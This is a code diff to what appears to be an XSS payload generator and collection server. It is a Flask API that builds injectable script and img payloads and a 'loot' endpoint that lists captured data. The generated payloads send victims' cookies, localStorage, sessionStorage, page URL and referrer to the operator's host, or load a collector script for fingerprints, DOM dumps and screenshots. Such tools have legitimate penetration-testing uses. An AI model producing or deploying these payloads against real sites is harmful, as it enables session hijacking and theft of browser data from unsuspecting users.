@@ -1,3 +1,4 @@
+import base64
 import json
 
 from app import db
@@ -7,137 +8,103 @@ from app.models import XSS, Client
 from flask import jsonify, request
 from flask_jwt_extended import jwt_required
 
+PAYLOADS = {
+    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
+    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
+    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
+    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
+    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
+}
 
-@bp.route("/xss/generate", methods=["GET"])
+
+@bp.route("/xss/generate", methods=["POST"])
 @jwt_required()
 def xss_generate():
     """Generates an XSS payload"""
 
-    parameters = request.args.to_dict()
+    data = request.get_json()
 
-    if "client_id" not in parameters:
-        return jsonify({"status": "error", "detail": "Missing client_id parameter"}), 400
-    if not parameters["client_id"].isnumeric():
-        return jsonify({"status": "error", "detail": "Bad client ID"}), 400
+    client_id = data.get("client_id", None)
+    if not client_id:
+        return jsonify({"status": "error", "detail": "Missing client_id"}), 400
+    client = Client.query.filter_by(id=data["client_id"]).first_or_404()
 
-    client = Client.query.filter_by(id=parameters["client_id"]).first_or_404()
-    parameters.pop("client_id", None)
-    uid = client.uid
-    other_data = ""
-    xss_type = "r"
-    require_js = False
-    require_params = False
-    cookies = False
-    local_storage = False
-    session_storage = False
-    get_url = False
-    i_want_it_all = False
-    code_type = "html"
-    url = ""
+    url = data.get("url", None)
+    if not url:
+        return jsonify({"status": "error", "detail": "Missing url"}), 400
 
-    if "url" not in parameters.keys():
-        return jsonify({"status": "error", "detail": "Missing url parameter"}), 400
+    xss_type = data.get("xss_type", None)
+    if not xss_type:
+        return jsonify({"status": "error", "detail": "Missing xss_type"}), 400
 
-    for param, value in parameters.items():
+    code_type = data.get("code_type", None)
+    if not code_type:
+        return jsonify({"status": "error", "detail": "Missing code_type"}), 400
 
-        if param == "url":
-            url = value
-        elif param == "i_want_it_all":
-            i_want_it_all = True
-        elif param == "stored":
-            xss_type = "s"
-        elif param == "cookies":
-            cookies = True
-            require_js = True
-            require_params = True
-        elif param == "local_storage":
-            local_storage = True
-            require_js = True
-            require_params = True
-        elif param == "session_storage":
-            session_storage = True
-            require_js = True
-            require_params = True
-        elif param == "code":
-            if value == "html":
-                code_type = "html"
-            elif value == "js":
-                code_type = "js"
-                require_js = True
-            else:
-                return jsonify({"status": "error", "detail": "Unknown code type"}), 400
-        elif param == "geturl":
-            get_url = True
-            require_js = True
-            require_params = True
+    to_gather = data.get("to_gather", [])
+
+    tag_list = data.get("tags", [])
+    tags = ",".join(tag_list)
+
+    if code_type == "html":
+        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
+            payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
+            payload_mid = base64.b64encode(
+                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
+            ).decode()
+            payload_end = '")</script>'
+            payload = payload_start + payload_mid + payload_end
+            return jsonify({"status": "OK", "detail": payload}), 200
+
+        elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin_url" in to_gather or "referrer" in to_gather:
+            payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
+
+            payload_tags = f"tags={tags}" if tags else ""
+            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
+
+            payload_mid = "&".join([payload_tags, payload_to_gather]) if payload_tags else payload_to_gather
+            payload_end = "</script>"
+            payload = payload_start + payload_mid + payload_end
+            return jsonify({"status": "OK", "detail": payload}), 200
+
         else:
-            if other_data != "":
-                other_data += "&"
-            other_data += "{}={}".format(param, value)
-            require_params = True
+            payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
+            payload_tags = f"tags={tags}" if tags else ""
+            payload_start = f"{payload_start}?{payload_tags}" if payload_tags else payload_start
+            payload_end = '" />'
+            payload = payload_start + payload_end
+            return jsonify({"status": "OK", "detail": payload}), 200
 
-    if i_want_it_all:
-        if code_type == "js":
-            payload = ';}};var js=document.createElement("script");js.src="{}/static/collector.min.js";js.onload=function(){{sendData("{}/api/x/{}/{}","{}")}};document.body.appendChild(js);'.format(
-                url, url, xss_type, uid, other_data
-            )
-            return (payload), 200
-        else:
-            payload = """'>"><script src={}/static/collector.min.js></script><script>sendData("{}/api/x/{}/{}", "{}")</script>""".format(
-                url, url, xss_type, uid, other_data
-            )
-            return (payload), 200
-
-    if code_type == "js":
-        payload = ';};new Image().src="'
     else:
-        payload = """'>">"""
-        if require_js:
-            payload += '<script>new Image().src="'
+        if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
+            payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
+            payload_mid = base64.b64encode(
+                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
+            ).decode()
+
+            payload_end = '")};document.body.appendChild(js);'
+            payload = payload_start + payload_mid + payload_end
+            return jsonify({"status": "OK", "detail": payload}), 200
+
         else:
-            payload += '<img src="'
+            payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
 
-    payload += "{}/api/x/{}/{}".format(url, xss_type, uid)
+            payload_tags = f"tags={tags}" if tags else ""
+            payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
 
-    if require_params:
-        payload += "?"
+            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_tags or payload_to_gather else payload_start
 
-        if cookies:
-            payload += 'cookies="+encodeURIComponent(document.cookie)'
+            payload_mid = ""
+            if payload_tags and payload_to_gather:
+                payload_mid = "&".join([payload_tags, payload_to_gather])
+            elif payload_tags:
+                payload_mid = payload_tags
+            elif payload_to_gather:
+                payload_mid = payload_to_gather
 
-        if local_storage:
-            if cookies:
-                payload += '+"&'
-            payload += 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))'
-
-        if session_storage:
-            if cookies or local_storage:
-                payload += '+"&'
-            payload += 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))'
-
-        if get_url:
-            if cookies or local_storage or session_storage:
-                payload += '+"&'
-            payload += 'origin_url="+encodeURIComponent(location.href)'
-
-        if other_data != "":
-            if cookies or local_storage or session_storage or get_url:
-                payload += '+"&'
-            payload += other_data
-            payload += '"'
-
-    if not require_params:
-        payload += '"'
-
-    if code_type == "js":
-        payload += ";"
-    else:
-        if require_js:
-            payload += "</script>"
-        else:
-            payload += " />"
-
-    return (payload), 200
+            payload_end = ";"
+            payload = payload_start + payload_mid + payload_end
+            return jsonify({"status": "OK", "detail": payload}), 200
 
 
 @bp.route("/xss/<int:xss_id>", methods=["GET"])
@@ -221,7 +188,7 @@ def client_xss_all_get():
 @jwt_required()
 def client_loot_get():
     """Get all captured data based on a filter"""
-    loot = {}
+    loot = []
 
     filter_expression = {}
     parameters = request.args.to_dict()
@@ -234,12 +201,13 @@ def client_loot_get():
     xss = XSS.query.filter_by(**filter_expression).all()
 
     for hit in xss:
-        for element in json.loads(hit.data).items():
-            if element[0] not in loot.keys():
-                loot[element[0]] = []
-            if element[0] == "fingerprint" or element[0] == "dom" or element[0] == "screenshot":
-                loot[element[0]].append({hit.id: ""})
+        loot_entry = {"xss_id": hit.id, "tags": json.loads(hit.tags), "data": {}}
+        for element_name, element_value in json.loads(hit.data).items():
+            if element_name in ["fingerprint", "dom", "screenshot"]:
+                loot_entry["data"].update({element_name: ""})
             else:
-                loot[element[0]].append({hit.id: element[1]})
+                loot_entry["data"].update({element_name: element_value})
+
+        loot.append(loot_entry)
 
     return jsonify(loot), 200
